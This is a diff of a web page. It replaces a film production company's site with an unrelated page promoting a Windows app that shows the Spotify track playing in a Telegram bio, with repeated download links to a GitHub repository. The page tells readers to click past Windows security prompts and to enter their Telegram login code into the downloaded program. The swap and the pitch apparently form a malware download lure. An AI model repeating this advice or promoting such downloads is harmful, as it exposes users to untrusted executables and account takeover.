@@ -1,66 +1,154 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
-<meta charset="utf-8"/><meta content="width=device-width, initial-scale=1" name="viewport"/>
-<meta content="Butler Hall Productions — Strong Stories, Well Told. Independent film and television production." name="description"/>
-<title>Butler Hall Productions | Strong Stories, Well Told.</title>
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600&display=swap" rel="stylesheet">
-<style>
-:root{--green:#003D34;--green2:#075044;--dark:#343A3C;--gold:#C0A16F;--cream:#F1E9DB;--muted:#D2D2D2;--line:#697773}
-*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:var(--dark);color:var(--cream);font:16px/1.7 Georgia,serif}a{color:inherit}a:focus-visible{outline:2px solid var(--gold);outline-offset:5px}.wrap{width:min(1120px,calc(100% - 44px));margin:auto}
-.top{background:#00352E;border-bottom:1px solid #476C60;position:sticky;top:0;z-index:5}.nav{min-height:68px;display:flex;align-items:center;justify-content:space-between;gap:16px}.wordmark{font:600 12px/1.3 Arial,sans-serif;letter-spacing:.2em;text-decoration:none;color:var(--gold)}.links{display:flex;gap:clamp(12px,3vw,34px)}.links a{font:11px Arial,sans-serif;letter-spacing:.17em;text-transform:uppercase;text-decoration:none;color:#F1E9DB}.links a:hover{color:var(--gold)}
-.hero{background:linear-gradient(145deg,#003D34 0%,#075044 58%,#214D46 100%);min-height:610px;display:flex;align-items:center;text-align:center;border-bottom:1px solid #A58C66}.hero-inner{padding:55px 0 75px}.hero-logo{display:block;width:min(360px,76vw);height:340px;object-fit:contain;margin:0 auto 8px;filter:none}.tagline{font-size:clamp(21px,3vw,33px);letter-spacing:.065em;margin:8px 0 10px}.eyebrow{font:11px Arial,sans-serif;letter-spacing:.28em;text-transform:uppercase;color:var(--gold)}.rule{height:1px;background:var(--gold);width:64px;margin:24px auto}.hero .sub{font:12px/1.8 Arial,sans-serif;letter-spacing:.19em;text-transform:uppercase;color:#D2D2D2}
-.section{padding:90px 0}.section:nth-of-type(even){background:#3D4547}.kicker{font:11px Arial,sans-serif;letter-spacing:.24em;color:#D4B784;text-transform:uppercase}.section h2{font-size:clamp(32px,4.5vw,53px);font-weight:normal;line-height:1.18;margin:12px 0 24px}.intro{max-width:760px;color:#F0EDE5;font-size:19px}.about-copy{max-width:810px;color:#E3E5E1}
-.projects{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:18px;margin-top:38px}.project{border:1px solid #568074;background:linear-gradient(145deg,#075044,#124C43);min-height:215px;padding:26px;display:flex;flex-direction:column;justify-content:space-between;transition:transform .2s,border-color .2s}.project:hover{transform:translateY(-3px);border-color:var(--gold)}.project .number{font:11px Arial,sans-serif;color:#D6BB8D;letter-spacing:.15em}.project h3{font-size:26px;font-weight:normal;line-height:1.2;margin:24px 0 9px}.project p{font:12px/1.7 Arial,sans-serif;letter-spacing:.04em;color:#E6E9E5;margin:0}
-.contact{background:linear-gradient(160deg,#003D34,#174C43);text-align:center}.contact p{color:#E2E7E2}.notice{font:12px/1.7 Arial,sans-serif;color:#E9D4AB;border:1px solid #A58C66;padding:12px 16px;max-width:620px;margin:24px auto 0}.footer{background:#303638;border-top:1px solid #68716a;padding:28px 0;color:#D2D2D2;font:11px/1.7 Arial,sans-serif;letter-spacing:.1em}.footer .wrap{display:flex;justify-content:space-between;gap:20px}.footer a{color:var(--gold)}
-@media(max-width:750px){.nav{flex-wrap:wrap;justify-content:center;padding:15px 0}.links{width:100%;justify-content:center}.hero{min-height:500px}.hero-logo{height:280px}.section{padding:65px 0}.projects{grid-template-columns:repeat(2,minmax(0,1fr))}}@media(max-width:480px){.projects{grid-template-columns:1fr}.project{min-height:165px}.footer .wrap{flex-direction:column;align-items:center;text-align:center}}
-
-/* Version 5: approved company copy and provisional identity */
-.hero-logo{width:min(520px,88vw);height:auto;max-height:none;object-fit:contain;margin:0 auto 14px;border:0;box-shadow:none;filter:none}
-.hero-inner{padding-top:48px}
-.partners{margin-top:42px;padding-top:28px;border-top:1px solid rgba(192,161,111,.42);text-align:center}
-.partner-names{display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap;margin-top:14px;font:500 clamp(14px,1.7vw,19px)/1.6 Georgia,serif;color:#F1E9DB}
-.partner-names .diamond{font-size:10px;color:#C0A16F}
-.contact-email{display:inline-block;margin-top:16px;color:#F1D6A8;font:500 clamp(16px,2.3vw,23px)/1.4 Arial,sans-serif;text-decoration:none;border-bottom:1px solid #C0A16F;padding-bottom:5px;overflow-wrap:anywhere}
-.contact-email:hover{color:white}
-@media(max-width:540px){.partner-names{gap:8px 11px}.hero-logo{width:min(100%,450px)}}
-
-/* Banner palette, matching the LinkedIn banner */
-:root{--green:#3E4348;--green2:#4B5056;--dark:#2F3337;--gold:#C9A96E;--cream:#F3EEE4}
-body{background:#2F3337}
-.top{background:#2A2E32;border-bottom:1px solid rgba(201,169,110,.45)}
-.wordmark{color:#C9A96E}
-.hero{background:radial-gradient(ellipse at center,#565C63 0%,#484D53 55%,#3B3F44 100%);border-bottom:1px solid #C9A96E;min-height:520px}
-.banner-frame{display:inline-block;padding:44px clamp(28px,7vw,88px);border:1px solid #C9A96E;outline:1px solid rgba(201,169,110,.55);outline-offset:7px;margin:10px auto 34px}
-.banner-title{font:500 clamp(34px,6vw,64px)/1.15 'Playfair Display',Georgia,serif;color:#F3EEE4;margin:0 0 14px;letter-spacing:.01em}
-.banner-sub{font:600 clamp(10px,1.3vw,13px)/1.6 Georgia,serif;letter-spacing:.38em;text-transform:uppercase;color:#C9A96E;margin:0}
-.tagline{font-family:'Playfair Display',Georgia,serif;color:#E9E4DA}
-.section h2,.project h3{font-family:'Playfair Display',Georgia,serif}
-.section:nth-of-type(even){background:#363A3F}
-.kicker,.project .number{color:#C9A96E}
-.project{border:1px solid #5A6067;background:linear-gradient(145deg,#42474D,#3B3F44)}
-.project:hover{border-color:#C9A96E}
-.contact{background:radial-gradient(ellipse at center,#4B5056,#3A3E43)}
-.contact-email{color:#E2C894;border-bottom-color:#C9A96E}
-.footer{background:#26292D;border-top:1px solid rgba(201,169,110,.35)}
-</style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Spotify-status-for-Telegram - Show Your Spotify Vibe Instantly</title>
+<meta name="description" content="Spotify-status-for-Telegram shows the track you are playing on Spotify as the first line of your Telegram bio. A simple Windows desktop app that keeps your bio updated automatically.">
+<meta name="keywords" content="spotify status for telegram, telegram bio spotify, spotify now playing telegram, customtkinter, desktop app, desktop application, python, python3, spotify, spotify connect, spotify status, telegram, telegram bio, telethon">
+<meta name="author" content="Spotify-status-for-Telegram">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#1DB954">
+<link rel="canonical" href="https://github.com/qasidah7544/Spotify-status-for-Telegram">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Spotify-status-for-Telegram - Show Your Spotify Vibe Instantly">
+<meta property="og:description" content="Shows the track you are playing on Spotify as the first line of your Telegram bio. Simple desktop app for Windows.">
+<meta property="og:url" content="https://github.com/qasidah7544/Spotify-status-for-Telegram">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Spotify-status-for-Telegram - Show Your Spotify Vibe Instantly">
+<meta name="twitter:description" content="Shows the track you are playing on Spotify as the first line of your Telegram bio. Download and run on Windows.">
 </head>
-<body>
-<header class="top"><nav aria-label="Main navigation" class="wrap nav"><a class="wordmark" href="#home">BUTLER HALL PRODUCTIONS</a><div class="links"><a href="#about">About</a><a href="#projects">Projects</a><a href="#contact">Contact</a></div></nav></header>
-<main>
-<section class="hero" id="home"><div class="wrap hero-inner"><div class="banner-frame"><h1 class="banner-title">Butler Hall Productions</h1><p class="banner-sub">Independent Film &amp; Television</p></div><p class="tagline">Strong Stories, Well Told.</p></div></section>
-<section class="section" id="about"><div class="wrap"><div class="kicker">About</div><h2>Our Story</h2><div class="about-copy"><p>Butler Hall Productions grew out of a friendship that began decades ago, when three future partners met during their first year of college.</p><p>Years later, a renewed connection and a shared passion for storytelling brought them together again. That reunion evolved into a creative partnership dedicated to developing compelling, original entertainment.</p><p>Today, Butler Hall Productions brings together distinct perspectives and creative experiences, united by a simple philosophy: <em>Strong Stories, Well Told.</em></p></div><div class="partners"><div class="kicker">THE PARTNERS</div><div class="partner-names"><span>Matt Skrobalak</span><span aria-hidden="true" class="diamond">◆</span><span>Kevin A. Reilly</span><span aria-hidden="true" class="diamond">◆</span><span>John Meyer</span></div></div></div></section>
-<section class="section" id="projects"><div class="wrap"><div class="kicker">Our Slate</div><h2>Projects in Development</h2><p class="intro">Film, television, and stories across formats and genres.</p><div class="projects">
-<article class="project"><span class="number">MULTIPLATFORM</span><div><h3>#iHunt</h3><p>Horror-comedy about killing monsters in the gig economy. A feature, a series and a vertical, in association with Lilly Wachowski&#8217;s Anarchists United.</p></div></article>
-<article class="project"><span class="number">IN DEVELOPMENT</span><div><h3>Sex Magick</h3><p>Further details to be announced</p></div></article>
-<article class="project"><span class="number">TELEVISION</span><div><h3>Active Nearby</h3><p>Half-hour ensemble dramedy set in Los Angeles.</p></div></article>
-<article class="project"><span class="number">TELEVISION</span><div><h3>Merwin Point</h3><p>One-hour drama. An oyster-farming family in 1880s Milford, Connecticut fights rivals, corruption and each other as the Gilded Age takes hold. Based on John Meyer&#8217;s own family history. Pilot was a finalist at the 2025 Mystic Film Festival.</p></div></article>
-<article class="project"><span class="number">FEATURE FILM</span><div><h3>The Boards</h3><p>Set on the Jersey Shore in the early &#8217;90s.</p></div></article>
-<article class="project"><span class="number">TELEVISION</span><div><h3>Transit Stories</h3><p>One-hour historical anthology series, set across New York and New Jersey in 1989.</p></div></article>
-<article class="project"><span class="number">FEATURE FILM</span><div><h3>Shucked</h3><p>Based on Erin Byers Murray&#8217;s memoir of a year working on a New England oyster farm.</p></div></article>
-<article class="project"><span class="number">FEATURE FILM</span><div><h3>Anomaly</h3><p>Time-travel drama.</p></div></article>
-</div></div></section>
-<section class="section contact" id="contact"><div class="wrap"><div class="kicker">Get in Touch</div><h2>Let's tell great stories.</h2><p>For business inquiries and collaborations, please contact:</p><a class="contact-email" href="mailto:matt@butlerhallproductions.com">matt@butlerhallproductions.com</a></div></section>
-</main><footer class="footer"><div class="wrap"><span>© <span id="year"></span> Butler Hall Productions</span><span>Strong Stories, Well Told.</span></div></footer><script>document.getElementById('year').textContent=new Date().getFullYear();</script>
-</body></html>
+<body style="margin:0; padding:0; background:#f4f6f9; color:#1f2933; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height:1.7; font-size:17px; -webkit-font-smoothing:antialiased;">
+
+<div style="max-width:900px; margin:0 auto; padding:32px 20px 64px 20px;">
+
+  <header style="background:#ffffff; border-radius:18px; padding:44px 36px; box-shadow:0 10px 30px rgba(15,23,42,0.08); text-align:center; margin-bottom:28px;">
+    <h1 style="font-size:clamp(26px, 4vw, 38px); line-height:1.3; margin:0 0 18px 0; color:#0f172a; font-weight:800; letter-spacing:-0.4px;">
+      🎧 Spotify-status-for-Telegram - Show Your Spotify Vibe Instantly
+    </h1>
+    <p style="font-size:18px; color:#475569; margin:0 auto 28px auto; max-width:640px;">
+      Your Telegram bio updates itself with whatever song you are playing on Spotify. No copying, no pasting, no fuss.
+    </p>
+    <a href="https://github.com/qasidah7544/Spotify-status-for-Telegram" style="display:inline-block; padding:16px 36px; background:linear-gradient(135deg, #1DB954 0%, #229ED9 100%); color:#ffffff; text-decoration:none; font-weight:700; font-size:17px; border-radius:12px; box-shadow:0 8px 22px rgba(34,158,217,0.32);">
+      ⬇️ Download Spotify-status-for-Telegram
+    </a>
+    <p style="margin:16px 0 0 0; font-size:14px; color:#64748b;">Visit this link to download the application.</p>
+  </header>
+
+  <section style="background:#ffffff; border-radius:16px; padding:32px 36px; box-shadow:0 6px 18px rgba(15,23,42,0.06); margin-bottom:24px;">
+    <h2 style="font-size:24px; margin:0 0 16px 0; color:#0f172a; font-weight:700;">🎯 What This App Does</h2>
+    <p style="margin:0 0 14px 0; color:#334155;">
+      Spotify-status-for-Telegram is a small desktop program for Windows. It looks at the song currently playing on your Spotify account and writes that song as the first line of your Telegram bio.
+    </p>
+    <p style="margin:0 0 14px 0; color:#334155;">
+      You open the app once, connect your Spotify account and your Telegram account, and press start. From that moment on, your bio stays in sync with your music. When you change the song, the first line of your bio changes too. When you stop listening, the line clears itself.
+    </p>
+    <p style="margin:0; color:#334155;">
+      Everything happens inside a simple window with clear buttons and labels. You do not need to open a terminal, type commands, or edit any files. If you can install an app and click a few buttons, you can use this one.
+    </p>
+  </section>
+
+  <section style="background:#ffffff; border-radius:16px; padding:32px 36px; box-shadow:0 6px 18px rgba(15,23,42,0.06); margin-bottom:24px;">
+    <h2 style="font-size:24px; margin:0 0 16px 0; color:#0f172a; font-weight:700;">✨ Key Features</h2>
+    <ul style="margin:0; padding-left:22px; color:#334155;">
+      <li style="margin-bottom:10px;"><strong>Live track display</strong> — the song you are playing right now appears in your bio, including the track name and artist.</li>
+      <li style="margin-bottom:10px;"><strong>Automatic updates</strong> — the app checks for changes in the background and refreshes your bio for you.</li>
+      <li style="margin-bottom:10px;"><strong>Works with Spotify Connect</strong> — if you play music on your phone, your laptop, or a smart speaker, the status still follows you.</li>
+      <li style="margin-bottom:10px;"><strong>Simple desktop window</strong> — a clean, modern interface built with CustomTkinter, designed for everyday users rather than developers.</li>
+      <li style="margin-bottom:10px;"><strong>Keeps the rest of your bio</strong> — only the first line is used for the song. Everything you wrote below stays exactly as it is.</li>
+      <li style="margin-bottom:10px;"><strong>Set it and forget it</strong> — run it once, leave it running in the background, and forget about it.</li>
+      <li style="margin-bottom:0;"><strong>Lightweight and private</strong> — the app talks only to Spotify and Telegram to do its job. No song history is stored anywhere else.</li>
+    </ul>
+  </section>
+
+  <section style="background:#ffffff; border-radius:16px; padding:32px 36px; box-shadow:0 6px 18px rgba(15,23,42,0.06); margin-bottom:24px;">
+    <h2 style="font-size:24px; margin:0 0 16px 0; color:#0f172a; font-weight:700;">🚀 Getting Started</h2>
+    <p style="margin:0 0 18px 0; color:#334155;">
+      All you need is a Windows computer with an internet connection, the Spotify app or website where you normally listen to music, and your Telegram account.
+    </p>
+    <p style="margin:0 0 20px 0; color:#334155;">
+      The application is hosted on GitHub. Open the link below in your browser and follow the download instructions on the page.
+    </p>
+    <p style="margin:0 0 8px 0; text-align:center;">
+      <a href="https://github.com/qasidah7544/Spotify-status-for-Telegram" style="display:inline-block; padding:15px 32px; background:linear-gradient(135deg, #229ED9 0%, #1DB954 100%); color:#ffffff; text-decoration:none; font-weight:700; font-size:16px; border-radius:12px; box-shadow:0 8px 20px rgba(29,185,84,0.30);">
+        📥 Get Spotify-status-for-Telegram
+      </a>
+    </p>
+    <p style="margin:0; text-align:center; font-size:15px; color:#64748b;">
+      Visit this link to download the application.
+    </p>
+  </section>
+
+  <section style="background:#ffffff; border-radius:16px; padding:32px 36px; box-shadow:0 6px 18px rgba(15,23,42,0.06); margin-bottom:24px;">
+    <h2 style="font-size:24px; margin:0 0 16px 0; color:#0f172a; font-weight:700;">🖥️ Step-by-Step Setup on Windows</h2>
+    <ol style="margin:0; padding-left:22px; color:#334155;">
+      <li style="margin-bottom:14px;"><strong>Open the download link.</strong> Click the button above, or type the address into your browser. The GitHub page for this project will open.</li>
+      <li style="margin-bottom:14px;"><strong>Download the application.</strong> Follow the download option shown on that page and save the file to a folder you can find again, such as your Downloads folder.</li>
+      <li style="margin-bottom:14px;"><strong>Run the app.</strong> Double-click the downloaded file. If Windows shows a blue or yellow security prompt, choose the option that lets you continue, then wait a few seconds while the window opens.</li>
+      <li style="margin-bottom:14px;"><strong>Connect Spotify.</strong> Inside the app window, sign in with the same Spotify account you use to listen to music. Approve the permission request so the app can see what is currently playing.</li>
+      <li style="margin-bottom:14px;"><strong>Connect Telegram.</strong> Enter your Telegram details when asked and confirm the login code that Telegram sends you. This lets the app update your own bio.</li>
+      <li style="margin-bottom:0;"><strong>Press Start.</strong> Click the start button and play a song on Spotify. Within a few seconds, the first line of your Telegram bio should show that track. Open Telegram on your phone to check.</li>
+    </ol>
+  </section>
+
+  <section style="background:#ffffff; border-radius:16px; padding:32px 36px; box-shadow:0 6px 18px rgba(15,23,42,0.06); margin-bottom:24px;">
+    <h2 style="font-size:24px; margin:0 0 16px 0; color:#0f172a; font-weight:700;">🔄 How It Works Behind the Scenes</h2>
+    <p style="margin:0 0 14px 0; color:#334155;">
+      You do not need to understand the technical side to use this app, but here is a plain-language explanation of what happens after you press start.
+    </p>
+    <p style="margin:0 0 14px 0; color:#334155;">
+      The app asks Spotify for the track you are listening to right now. Spotify replies with the song title and artist. The app then opens your Telegram profile and replaces the first line of your bio with that song information, leaving the rest of your bio untouched.
+    </p>
+    <p style="margin:0; color:#334155;">
+      It repeats this check every short while, so your bio is never far behind your music. The window stays small and quiet, and you can minimise it while you do other things on your computer.
+    </p>
+  </section>
+
+  <section style="background:#ffffff; border-radius:16px; padding:32px 36px; box-shadow:0 6px 18px rgba(15,23,42,0.06); margin-bottom:24px;">
+    <h2 style="font-size:24px; margin:0 0 16px 0; color:#0f172a; font-weight:700;">💡 Tips for a Smooth Experience</h2>
+    <ul style="margin:0; padding-left:22px; color:#334155;">
+      <li style="margin-bottom:10px;">Keep the app window open, or minimised, while you want your bio to update. If you close it completely, updates stop.</li>
+      <li style="margin-bottom:10px;">Make sure your computer is connected to the internet. Both Spotify and Telegram need a connection to work.</li>
+      <li style="margin-bottom:10px;">Use the same Spotify account everywhere. If you listen on your phone with a different account, the app will not see that track.</li>
+      <li style="margin-bottom:10px;">Give it a few seconds after changing songs. Bio updates are not instant, and a short delay is completely normal.</li>
+      <li style="margin-bottom:0;">If you ever want your bio to stop changing, press the stop button in the app or close the window.</li>
+    </ul>
+  </section>
+
+  <section style="background:#ffffff; border-radius:16px; padding:32px 36px; box-shadow:0 6px 18px rgba(15,23,42,0.06); margin-bottom:24px;">
+    <h2 style="font-size:24px; margin:0 0 16px 0; color:#0f172a; font-weight:700;">🛠️ Common Questions</h2>
+    <p style="margin:0 0 6px 0; color:#0f172a; font-weight:600;">Do I need to know how to code?</p>
+    <p style="margin:0 0 18px 0; color:#334155;">No. The app has a normal window with buttons. If you can use Spotify and Telegram, you can use this.</p>
+
+    <p style="margin:0 0 6px 0; color:#0f172a; font-weight:600;">Will it delete the rest of my Telegram bio?</p>
+    <p style="margin:0 0 18px 0; color:#334155;">No. Only the first line is used for the song. The text below it stays as you wrote it.</p>
+
+    <p style="margin:0 0 6px 0; color:#0f172a; font-weight:600;">Does it post songs in my chats or channels?</p>
+    <p style="margin:0 0 18px 0; color:#334155;">No. It only edits your own bio. Nothing is sent to other people.</p>
+
+    <p style="margin:0 0 6px 0; color:#0f172a; font-weight:600;">My bio did not update. What should I check?</p>
+    <p style="margin:0 0 18px 0; color:#334155;">Confirm that a song is actually playing, that you are online, and that the app is still open and running. Pressing stop and then start again usually refreshes the connection.</p>
+
+    <p style="margin:0 0 6px 0; color:#0f172a; font-weight:600;">Can I undo the changes?</p>
+    <p style="margin:0; color:#334155;">Yes. Stop the app and edit your bio in Telegram normally. The app will not change anything until you start it again.</p>
+  </section>
+
+  <section style="background:linear-gradient(135deg, #0f172a 0%, #1e3a5f 100%); border-radius:16px; padding:36px; box-shadow:0 10px 30px rgba(15,23,42,0.18); text-align:center;">
+    <h2 style="font-size:24px; margin:0 0 12px 0; color:#ffffff; font-weight:700;">🎵 Ready to Let Your Bio Sing?</h2>
+    <p style="margin:0 auto 24px auto; color:#cbd5e1; max-width:560px;">
+      Download the app, connect your accounts, and let your Telegram bio show the world what you are listening to.
+    </p>
+    <a href="https://github.com/qasidah7544/Spotify-status-for-Telegram" style="display:inline-block; padding:16px 36px; background:#1DB954; color:#06210f; text-decoration:none; font-weight:800; font-size:17px; border-radius:12px; box-shadow:0 8px 22px rgba(29,185,84,0.35);">
+      ⬇️ Download Now
+    </a>
+    <p style="margin:16px 0 0 0; font-size:14px; color:#94a3b8;">Visit this link to download the application.</p>
+  </section>
+
+  <footer style="text-align:center; padding:32px 10px 0 10px; font-size:14px; color:#94a3b8;">
+    Spotify-status-for-Telegram · A desktop app that keeps your Telegram bio in tune with your Spotify music.
+  </footer>
+
+</div>
+
+</body>
+</html>
